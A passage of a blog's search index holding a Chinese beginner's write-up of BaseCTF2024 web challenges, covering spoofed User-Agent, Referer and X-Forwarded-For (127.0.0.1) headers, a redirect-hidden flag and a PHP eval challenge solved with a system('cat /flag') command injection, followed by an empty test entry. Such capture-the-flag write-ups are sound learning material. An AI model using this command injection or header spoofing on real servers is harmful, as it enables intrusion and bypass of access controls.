href="#4-用户代理-User-Agent" class="headerlink" title="4.用户代理(User-Agent)"></a>4.用户代理(User-Agent)</h2><p>User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等简单来说，UA是浏览器的身份证，让服务器知道你是谁？服务器通过识别UA，来响应适合你电脑、手机…的网络页面                      </p><p>原文链接：<a href="https://blog.csdn.net/qq_42680471/article/details/120706248">https://blog.csdn.net/qq_42680471&#x2F;article&#x2F;details&#x2F;120706248</a></p><p>这道题也是相同的思路，在Name一栏中填入User-Agent,Value一栏中填入Base再传递即可。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731664902742-e4e845d4-0e3e-429b-a183-5aa0aa846e93.png"></p><h2 id="5-来源-Referer"><a href="#5-来源-Referer" class="headerlink" title="5.来源(Referer)"></a>5.来源(Referer)</h2><p>Referer 请求头包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 Referer 请求头识别访问来源，可能会以此进行统计分析、日志记录以及缓存优化等。Referer的正确英语拼法是referrer 。由于早期HTTP规范的拼写错误，为了保持向后兼容就将错就错了。其它网络技术的规范企图修正此问题，使用正确拼法，所以目前拼法不统一。</p><p>referer的作用：</p><p>1.防盗链：防盗链是一种通过服务器端编程防止资源被盗用的技术，主要通过URL过滤和检查HTTP协议中的referer字段来实现。图片服务器每次取到Referer来判断一下是不是我自己的域名，如果是就继续访问，不是就拦截。</p><p>2.防止恶意请求：静态请求是*.html结尾的，动态请求是*.shtml，那么由此可以这么用，所有的*.shtml请求，必须 Referer为自己的网站。</p><p>这道题基本思路和上面的差不多，在Name一栏中填入Referer,Value一栏中填入Base再传递即可。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731664925831-7d2b101b-dae9-4ece-8cf9-e2478e163a3a.png"></p><h2 id="6-你的IP"><a href="#6-你的IP" class="headerlink" title="6.你的IP"></a>6.你的IP</h2><p>IP地址（Internet Protocol Address）是指互联网协议地址，又译为网际协议地址。IP地址是IP协议提供的一种统一的地址格式，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，以此来屏蔽物理地址的差异。</p><p>同时写网站的时候做好X-Forward-For可以防止有对它内部进行的一些的攻击，也可以伪造IP。</p><p>X-Forwarded-For（XFF）：是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。</p><p>这道题的思路同上。在Name一栏中填入X-Forward-For,Value一栏中填入127.0.0.1再传递即可。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731664940636-928926f3-6bc9-429d-baea-91442666bcf9.png"></p><h2 id="7-结束"><a href="#7-结束" class="headerlink" title="7.结束"></a>7.结束</h2><p>结束的时候会出现这个页面,提醒我们在一个页面转到另一个页面中途会经历什么</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731664954005-7afe702a-d0e6-4f11-ac46-c3793f3f815d.png"></p><p>这时候我们看一下这个网络这个选项卡里面发现每一次都经历了重定向，重定向(Redirect)就是通过各种方法将各种网络请求重新定个方向转到其它位置（如：网页重定向、域名的重定向、路由选择的变化也是对数据报文经由路径的一种重定向） ，通常是通过302的代码表示重定向，还有响应表头的location表示要把我重定向到哪里。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731664983230-288fc1e5-f4f8-4c41-bddb-a13a3a04d074.png"></p><p>这里的flag就重定向了一次，当访问到success时，又重定向到Thank you,然后把这个flag的信息抹去了，所以最后一句话我理解的意思是不要忘了flag。这里直接拿flag还不行，需要Base64解码来拿flag。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731665000874-999b5c12-4fb8-4057-a21c-10ba04e2eccb.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731665010605-17355475-5a40-4355-aa71-52422bf43c5e.png"></p><h1 id="三、喵喵喵´•ﻌ•"><a href="#三、喵喵喵´•ﻌ•" class="headerlink" title="三、喵喵喵´•ﻌ•&#96;"></a>三、喵喵喵´•ﻌ•&#96;</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731665032335-02ca1b89-f436-49f2-b449-cc270d56ee5f.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731665053491-4ac28d63-3b25-47bc-96e3-619665aa1892.png"></p><p>PHP是一种流行的通用脚本语言，尤其适用于网络开发。从博客到世界上最流行的网站，PHP 都能为其提供快速、灵活和实用的支持。</p><p>这道题是接收GET参数DT，然后把GET的参数传入到eval中去。</p><p>关于eval函数：</p><p>eval() 函数把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。如果没有在代码字符串中调用return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p><p>这道题需要使用system函数</p><p>关于system函数：</p><p>在PHP中，system函数是用来执行外部程序并显示输出的。这个函数与C语言中的system函数类似，它执行指定的命令并输出结果。如果PHP在服务器模块中运行，system函数还会尝试在每行输出完毕后自动刷新web服务器的输出缓存。要使用system函数，你需要提供要执行的命令作为参数。如果你还想获取命令执行后的返回状态，可以提供一个额外的参数来存储这个状态。system函数会返回命令输出的最后一行，如果执行失败则返回false。</p><p>上面可以直接传入代码、shell指令，语法还是前面?加DT&#x3D;，接函数名system和()，()里的内容为’cat &#x2F;flag’是代表cat根目录下的flag，中间空格不要忘，末尾有个分号“;”不要忘。之后就拿到flag了。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731665119589-381f9ef6-61c1-40b6-b9e6-32c42320644f.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731665091479-155ecf7c-4f6e-419b-bb44-141f886e46f8.png"></p><h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>这次在BaseCTF2024新生赛中确实了解到了很多：flag的含义、HTTP、Hackbar、ladder、URL、百分号编码、<font style="color:rgb(24,24,24);">HTTP四种请求：“POST、GET、DELETE、PUT”、</font>Cookie、来源(Referer)、IP地址（Internet Protocol Address）、重定向(Redirect)、PHP<font style="color:rgb(51,51,51);">脚本语言</font>、eval函数、system函数的基本含义。同时也让我知道了互联网的世界真的很大，我现在掌握的知识还很少，需要不断学习进步。加油！</p>]]></content>
      
      
      <categories>
          
          <category> HelloWeb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Knowledge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>test</title>
      <link href="/2021/03/04/test/Rikka/"/>
      <url>/2021/03/04/test/Rikka/</url>
      
        <content type="html"><![CDATA[<h1 id="Hello"><a href="#Hello" class="headerlink" title="Hello"></a>Hello</h1><p>123</p><h1 id="World"><a href="#World" class="headerlink" title="World"></a>World</h1><p>456</p>]]></content>
      
      
      <categories>
          
          <category> test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
